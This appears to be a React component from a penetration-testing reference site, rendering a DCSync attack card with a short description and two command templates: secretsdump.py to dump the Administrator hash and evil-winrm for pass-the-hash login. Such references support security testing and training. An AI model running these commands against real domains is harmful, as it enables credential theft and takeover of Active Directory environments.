import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const DCSyncAttack = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Description</Typography>
            <Typography>
              With GetChanges and GetChangesAll, we can perform a DCSync Attack.
              A DCSync Attack uses commands in the Directory Replication Service
              Remote Protocol (MS-DRSR), which is used by Domain Controllers to
              replicate domain data. DCSync uses MS-DRSR to simulate the
              behaviour of a domain controller and ask other domain controllers
              to replicate information.
            </Typography>
            <img src="/DCSync.png" height={191} width={467} />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Use Secretsdump.py to get the Administrator's hash.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"secretsdump.py {DOMAIN}/{USER}@{IP}"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Perform a Pass-the-Hash attack to login as Administrator.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"evil-winrm -H {NTLM_HASH} -u Administrator -i {IP}"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default DCSyncAttack;
